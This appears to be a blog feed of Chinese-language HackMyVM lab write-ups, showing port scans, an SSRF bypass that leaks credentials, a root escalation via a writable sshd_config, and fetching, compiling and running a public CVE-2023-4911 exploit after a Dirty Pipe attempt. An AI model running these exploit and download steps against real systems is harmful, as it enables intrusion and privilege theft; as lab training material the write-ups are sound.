+[+][kernel:CVE-2022-0847] Restoring contents of /etc/passwd...
+[+][kernel:CVE-2022-0847] Opening '/etc/passwd' for read...
+[+][kernel:CVE-2022-0847] Creating pipe...
+[+][kernel:CVE-2022-0847] Determining pipe size...
+[+][kernel:CVE-2022-0847] Pipe size is 65536.
+[+][kernel:CVE-2022-0847] Filling pipe...
+[+][kernel:CVE-2022-0847] Draining pipe...
+[+][kernel:CVE-2022-0847] Pipe drained.
+[+][kernel:CVE-2022-0847] Splicing data...
+[+][kernel:CVE-2022-0847] Writing to dirty pipe...
+[+][kernel:CVE-2022-0847] Write of '/etc/passwd' successful!
+[+][error] Exploit failed: invalid password
+[+] Continuing to look for opportunities
+[+] Nothing found to exploit.
+```
+
+不可以，那还是我们自己找吧
+
+```bash
+angela@pipy:/tmp$ uname -a
+Linux pipy 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+angela@pipy:/tmp$ lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.3 LTS
+Release:        22.04
+Codename:       jammy
+```
+
+找一下，发现**[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**可以，但是要用特定的脚本，有些脚本不行
+
+```bash
+#kali
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ wget https://github.com/leesh3288/CVE-2023-4911/archive/refs/heads/main.zip
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ python3 -m http.server 80                                                                   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+#靶机
+angela@pipy:/tmp$ wget 192.168.205.141/main.zip
+--2025-01-18 03:06:17--  http://192.168.205.141/main.zip
+Connecting to 192.168.205.141:80... failed: Connection refused.
+angela@pipy:/tmp$ wget 192.168.205.141/main.zip
+--2025-01-18 03:06:25--  http://192.168.205.141/main.zip
+Connecting to 192.168.205.141:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3044 (3.0K) [application/octet-stream]
+Saving to: ‘main.zip’
+
+main.zip                                                   0%[                                                                       main.zip.1                                                 100%[========================================================================================================================================&gt;]   2.97K  --.-KB/s    in 0s    
+
+2025-01-18 03:06:25 (21.8 MB/s) - ‘main.zip’ saved [3044/3044]
+
+angela@pipy:/tmp$ unzip main.zip
+Archive:  main.zip
+acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
+   creating: CVE-2023-4911-main/
+  inflating: CVE-2023-4911-main/Makefile  
+  inflating: CVE-2023-4911-main/README.md  
+  inflating: CVE-2023-4911-main/exp.c  
+  inflating: CVE-2023-4911-main/gen_libc.py  
+angela@pipy:/tmp$ cd CVE-2023-4911-main/
+angela@pipy:/tmp/CVE-2023-4911-main$ make
+gcc -o exp exp.c
+python3 gen_libc.py
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+./exp
+try 100
+# id
+uid=0(root) gid=0(root) groups=0(root),1000(angela)
+
+```。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Pipy.html</guid><pubDate>Thu, 20 Mar 2025 08:18:02 +0000</pubDate></item><item><title>hmv_oliva</title><link>https://7r1UMPH.github.io/post/hmv_oliva.html</link><description># hmv_oliva
+
+# 0. 简介
+
+**靶机**：[hackmyvm - oliva](https://hackmyvm.eu/machines/machine.php?vm=oliva)
+**难度**：绿色
+**目标 IP**：192.168.205.138
+**本机 IP**：192.168.205.141
+
+# 1. 扫描
+
+使用 `nmap` 扫描：
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 08:43 CST
+Nmap scan report for 192.168.205.138
+Host is up (0.00029s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:84:83:23 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.44 seconds
+```
+
+扫描结果显示目标开启了 **SSH** (22/tcp) 和 **HTTP** (80/tcp) 服务。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_oliva.html</guid><pubDate>Thu, 20 Mar 2025 08:17:00 +0000</pubDate></item><item><title>hmv_Minimal</title><link>https://7r1UMPH.github.io/post/hmv_Minimal.html</link><description># hmv_Minimal
+
+# 0.简介
+
+**靶机**：[hackmyvm - Minimal](https://hackmyvm.eu/machines/machine.php?vm=Minimal)
+**难度**：黄色
+**目标 IP**：192.168.205.135
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.135
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 14:58 CST
+Nmap scan report for 192.168.205.135
+Host is up (0.00054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:0D:67:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
+```
+
+先看**80端口**，**22端口**候补
+
+# 2.踩点
+
+![image](https://github.com/user-attachments/assets/e779669a-453f-45b8-af0d-3cbc172561ce)
+
+（页面挺简洁）发现一个**登录网页(login.php)**  ，测试了`弱密码、sql注入、万能密码`均无果，没有现成的，我们自己注册一个
+
+![image](https://github.com/user-attachments/assets/d57f31d8-97d2-419e-99a0-a002e6e3086d)
+
+注册完之后，可以把一些商品加入购物车
+
+![image](https://github.com/user-attachments/assets/535d5286-48d7-4a29-ae43-f3ceebf03c31)
+
+当你准备买单的时候，点击`Buy items`会发现，网址出现了变化。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Minimal.html</guid><pubDate>Thu, 20 Mar 2025 08:15:58 +0000</pubDate></item><item><title>hmv_logan2</title><link>https://7r1UMPH.github.io/post/hmv_logan2.html</link><description># hmv_logan2
+
+# 0.简介
+
+**靶机**：[hackmyvm - logan2](https://hackmyvm.eu/machines/machine.php?vm=logan2)
+**难度**：黄色
+**目标 IP**：192.168.205.144
+**本机 IP**：192.168.205.141
+
+# 1.扫描
+
+`nmap`起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sS --min-rate 10000 -p- -Pn -sV 192.168.205.144
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 16:59 CST
+Nmap scan report for 192.168.205.144
+Host is up (0.00045s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
+3000/tcp open  http    Golang net/http server
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.95%I=7%D=1/20%Time=678E107B%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request')%r(GetRequest,1000,'HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
+SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
+SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=abfb225a6c69b259;
+SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=1KgRX_Fci-rGge6j5LIyElk
+SF:Aqp46MTczNzM2MzU3ODgyMTcyMjg4Mg;\x20Path=/;\x20Expires=Tue,\x2021\x20Ja
+SF:n\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20SAMEOR
+SF:IGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x20GMT\r\n\r\n&lt;!
+SF:DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'theme-\'&gt;\n&lt;head\x
+SF:20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;meta\x20name=\'v
+SF:iewport\'\x20content=\'width=device-width,\x20initial-scale=1\'&gt;\n\t&lt;me
+SF:ta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edge\'&gt;\n\t&lt;title&gt;
+SF:\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link
+SF:\x20rel=\'manifest\'\x20href=\'/manifest\.json\'\x20crossorigin=\'use-c
+SF:redentials\'&gt;\n\t&lt;meta\x20name=\'theme-color\'\x20content=\'#6cc644\'&gt;\
+SF:n\t&lt;meta\x20name=\'author\'\x20content=\'Gitea\x20-\x20Git\x20with\x20a
+SF:\x20cup\x20of\x20tea\'\x20/&gt;\n\t&lt;meta\x20name=\'description\'\x20conten
+SF:t=\'Gitea\x20\(Git\x20with\x20a\x20cup\x20of\x20tea\)\x20is\x20a\x20pai
+SF:nless')%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
+SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
+SF:ad\x20Request')%r(HTTPOptions,1000,'HTTP/1\.0\x20404\x20Not\x20Found\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en
+SF:-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=aa
+SF:35213287ba9b56;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=ibf5qw0V
+SF:W54yX8vVkKfbkR8gck06MTczNzM2MzU3ODgzNzkzMjYzOA;\x20Path=/;\x20Expires=T
+SF:ue,\x2021\x20Jan\x202025\x2008:59:38\x20GMT;\x20HttpOnly\r\nX-Frame-Opt
+SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2020\x20Jan\x202025\x2008:59:38\x
+SF:20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\'en-US\'\x20class=\'the
+SF:me-\'&gt;\n&lt;head\x20data-suburl=\'\'&gt;\n\t&lt;meta\x20charset=\'utf-8\'&gt;\n\t&lt;m
+SF:eta\x20name=\'viewport\'\x20content=\'width=device-width,\x20initial-sc
+SF:ale=1\'&gt;\n\t&lt;meta\x20http-equiv=\'x-ua-compatible\'\x20content=\'ie=edg
+SF:e\'&gt;\n\t&lt;title&gt;Page\x20Not\x20Found\x20-\x20\x20Gitea:\x20Git\x20with\x
+SF:20a\x20cup\x20of\x20tea\x20&lt;/title&gt;\n\t&lt;link\x20rel=\'manifest\'\x20hre
+SF:f=\'/manifest\.json\'\x20crossorigin=\'use-credentials\'&gt;\n\t&lt;meta\x20n
+SF:ame=\'theme-color\'\x20content=\'#6cc644\'&gt;\n\t&lt;meta\x20name=\'author\'
+SF:\x20content=\'Gitea\x20-\x20Git\x20with\x20a\x20cup\x20of\x20tea\'\x20/
+SF:&gt;\n\t&lt;meta\x20name=\'description\'\x20content=\'Gitea\x20\(Git\x20with\
+SF:x20a\x20c');
+MAC Address: 08:00:27:B1:96:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.94 seconds
+
+```
+
+80、3000都是http服务
+
+# 2.踩点
+
+80是欢迎页，有一个脚本。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_logan2.html</guid><pubDate>Thu, 20 Mar 2025 08:13:53 +0000</pubDate></item><item><title>hmv_Leet笔记</title><link>https://7r1UMPH.github.io/post/hmv_Leet-bi-ji.html</link><description># hmv_Leet笔记
+
+**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Leet
+
+**难度**：&lt;span data-type='text' style='color: var(--b3-font-color8);'&gt;红色&lt;/span&gt;
+
+**目标 IP**：192.168.205.208
+**本机 IP**：192.168.205.141
+
+# 1.端口枚举及服务探测
+
+使用 `nmap` 扫描目标 IP 的开放端口：
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.208
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 14:28 CST
+Nmap scan report for 192.168.205.208
+Host is up (0.00024s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+7777/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
+MAC Address: 08:00:27:39:2C:58 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
+```
+
+7777 端口是 Web 服务还是 python3.11.2 的，可能是想考 SSTI，去页面看眼。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_Leet-bi-ji.html</guid><pubDate>Thu, 20 Mar 2025 08:12:52 +0000</pubDate></item><item><title>hmv_jan</title><link>https://7r1UMPH.github.io/post/hmv_jan.html</link><description># 0.简介
+
+靶机：https://hackmyvm.eu/machines/machine.php?vm=jan
+ 难度：绿色
+ 目标 IP：192.168.205.136
+ 本机 IP：192.168.205.128
+
+# 1.扫描
+
+nmap起手
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ nmap -A 192.168.205.136
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:40 CST
+Nmap scan report for 192.168.205.136
+Host is up (0.00023s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
+| ssh-hostkey: 
+|   256 2c:0b:57:a2:b3:e2:0f:6a:c0:61:f2:b7:1f:56:b4:42 (ECDSA)
+|_  256 45:97:b0:2b:48:9b:4a:36:8e:db:44:bd:3f:15:cf:32 (ED25519)
+8080/tcp open  http    Golang net/http server
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Mon, 03 Feb 2025 04:40:49 GMT
+|     Content-Length: 45
+|     Content-Type: text/plain; charset=utf-8
+|     Welcome to our Public Server. Maybe Internal.
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   OfficeScan: 
+|     HTTP/1.1 400 Bad Request: missing required Host header
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|_    Request: missing required Host header
+|_http-open-proxy: Proxy might be redirecting requests
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.95%I=7%D=2/3%Time=67A048E1%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2003\x20Feb\x20202
+SF:5\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x20Public\x20Server
+SF:\.\x20Maybe\x20Internal\.')%r(HTTPOptions,A2,'HTTP/1\.0\x20200\x20OK\r\
+SF:nDate:\x20Mon,\x2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Lengt
+SF:h:\x2045\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcom
+SF:e\x20to\x20our\x20Public\x20Server\.\x20Maybe\x20Internal\.')%r(RTSPReq
+SF:uest,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
+SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
+SF:est')%r(FourOhFourRequest,A2,'HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x
+SF:2003\x20Feb\x202025\x2004:40:49\x20GMT\r\nContent-Length:\x2045\r\nCont
+SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nWelcome\x20to\x20our\x
+SF:20Public\x20Server\.\x20Maybe\x20Internal\.')%r(Socks5,67,'HTTP/1\.1\x2
+SF:0400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8
+SF:\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(GenericLines,
+SF:67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
+SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')
+SF:%r(Help,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest')%r(SSLSessionReq,67,'HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
+SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
+SF:\n400\x20Bad\x20Request')%r(LPDString,67,'HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request')%r(SIPOptions,67,'HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request')%r(OfficeScan,A3,'H
+SF:TTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20he
+SF:ader\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+SF:0close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Host\x20
+SF:header');
+MAC Address: 08:00:27:3A:49:D7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms 192.168.205.136
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.01 seconds
+                                                                             
+```
+
+8080端口sT和sS参数探测不出来，所以建议不使用
+
+# 2.踩点
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/                            
+Welcome to our Public Server. Maybe Internal.                                                                                                                                    
+```
+
+进行目录爆破
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u http://192.168.205.136:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,md,txt
+                                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben 'epi' Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.136:8080
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, md, txt]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET        1l        7w       45c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+400      GET        1l        3w       24c http://192.168.205.136:8080/redirect
+200      GET        2l        2w       16c http://192.168.205.136:8080/robots.txt
+[####################] - 54s   598005/598005  0s      found:2       errors:0    
+[####################] - 54s   598005/598005  11090/s http://192.168.205.136:8080/           
+```
+
+探索一波
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/redirect
+Parameter 'url' needed.
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/robots.txt
+/redirect
+/credz                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/credz   
+Only accessible internally.                                                                                                                                    
+```
+
+目前来看出题思路是通过/redirect访问/credz，进行尝试
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/credz   
+Only accessible internally.                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
+Only accessible internally.                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ curl -I http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt
+HTTP/1.1 200 OK
+Date: Mon, 03 Feb 2025 04:47:07 GMT
+Content-Length: 27
+Content-Type: text/plain; charset=utf-8
+```
+
+这里我测试了挺多绕过检测的方法，我就不写出来了，正确方法是
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=192.168.205.136:8080/credz'
+                                         
+```
+
+返回空白，空白就是有机可寻
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=127.0.0.1:8080/credz'
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ curl 'http://192.168.205.136:8080/redirect?url=127.0.0.1:8080/robots.txt&amp;url=/credz'            
+ssh/EazyLOL                                                                                                                                     
+```
+
+登录
+
+```
+┌──(kali㉿kali)-[~/test]
+└─$ ssh ssh@192.168.205.136
+The authenticity of host '192.168.205.136 (192.168.205.136)' can't be established.
+ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.136' (ED25519) to the list of known hosts.
+ssh@192.168.205.136's password: 
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;https://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+jan:~$ id
+uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
+```
+
+# 4.提权
+
+```
+jan:~$ ls -al
+total 12
+drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
+drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
+lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
+-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
+jan:~$ sudo -l
+Matching Defaults entries for ssh on jan:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for ssh:
+    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'
+
+User ssh may run the following commands on jan:
+    (root) NOPASSWD: /sbin/service sshd restart
+```
+
+大概率是改ssh的配置文件了，看看有没有权限
+
+```
+jan:~$ ls -al /etc/ssh/sshd_config
+-rw-rw-rw-    1 root     root          3355 Jan 28 09:01 /etc/ssh/sshd_config
+```
+
+有权限，那我们生成一个密钥，通过密钥登录root就好了
+
+```
+jan:~$ ssh-keygen -t rsa 
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/ssh/.ssh/id_rsa): 
+Created directory '/home/ssh/.ssh'.
+Enter passphrase for '/home/ssh/.ssh/id_rsa' (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/ssh/.ssh/id_rsa
+Your public key has been saved in /home/ssh/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:FNapkUoVgyB2BhdqurZup7sNDvaCmQhWvV/OC5czxA8 ssh@jan
+The key's randomart image is:
++---[RSA 3072]----+
+|  +.*o o*+ .     |
+| . *  o.ooo      |
+|  o .. ..o       |
+| o . ...o        |
+|. .   . SE       |
+|.o   .  ..+      |
+|B*    ..+= .     |
+|Xo=.   .ooo      |
+|oB*o     ..      |
++----[SHA256]-----+
+
+jan:~$ cp .ssh/id_rsa.pub /tmp/authorized_keys
+jan:~$ chmod 600 /tmp/authorized_keys 
+jan:~$ ls -la /tmp/
+total 8
+drwxrwxrwt    4 root     root           100 Feb  3 04:56 .
+drwxr-xr-x   21 root     root          4096 Jan 28 09:01 ..
+drwxrwxrwt    2 root     root            40 Feb  3 04:39 .ICE-unix
+drwxrwxrwt    2 root     root            40 Feb  3 04:39 .X11-unix
+-rw-------    1 ssh      ssh            561 Feb  3 04:56 authorized_keys
+
+jan:~$ vi /etc/ssh/sshd_config
+```
+
+![image-20250331191252272](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191252331.png)
+
+```
+jan:~$ sudo /sbin/service sshd restart
+ * Stopping sshd ...                                                                                                             [ ok ]
+ * Starting sshd ...                                                                                                             [ ok ]
+jan:~$ ssh root@127.0.0.1
+/etc/ssh/ssh_config: line 23: Bad configuration option: banner
+/etc/ssh/ssh_config: terminating, 1 bad configuration options
+```
+
+banner应该也能提权，但是我不管它了
+
+```
+jan:~$ vi /etc/ssh/ssh_config
+```
+
+![image-20250331191302680](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191302731.png)
+
+```
+jan:~$ ssh root@127.0.0.1
+The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
+ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See &lt;https://wiki.alpinelinux.org/&gt;.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+jan:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+# 5.第二种方法
+
+![image-20250331191312627](https://cdn.jsdelivr.net/gh/7r1UMPH/7r1UMPH.github.io@main/static/image/20250331191312690.png)
+
+🔗https://blog.kongyu204.com/%E5%AE%89%E5%85%A8/%E9%9D%B6%E6%9C%BA/hackmyvm_jan/#%E6%8F%90%E6%9D%83
+
+这个方法我没试过，自己尝试一下吧
+
+&lt;!-- ##{'timestamp':1738580133}## --&gt;。</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_jan.html</guid><pubDate>Thu, 20 Mar 2025 08:11:50 +0000</pubDate></item><item><title>hmv_Immortal</title><link>https://7r1UMPH.github.io/post/hmv_Immortal.html</link><description># hmv_Immortal
+
+# 0.简介
+
+**靶机**：[hackmyvm - Immortal](https://hackmyvm.eu/machines/machine.php?vm=Immortal)
+**难度**：黄色
+**目标 IP**：192.168.205.223
+**本机 IP**：192.168.205.141
+
+---
+
+# 1.扫描
+
+`nmap` 起手，先探测端口
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ nmap 192.168.205.223
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 12:20 CST
+Nmap scan report for 192.168.205.223
+Host is up (0.00042s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:13:BB:B5 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+```
+
+没啥好说的，有 ftp 服务先尝试**匿名登录**
+
+---
+
+# 2.踩点
+
+## port 21
+
+```bash
+┌──(kali㉿kali)-[~/test]
+└─$ ftp 192.168.205.223     
+Connected to 192.168.205.223.
+220 (vsFTPd 3.0.3)
+Name (192.168.205.223:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
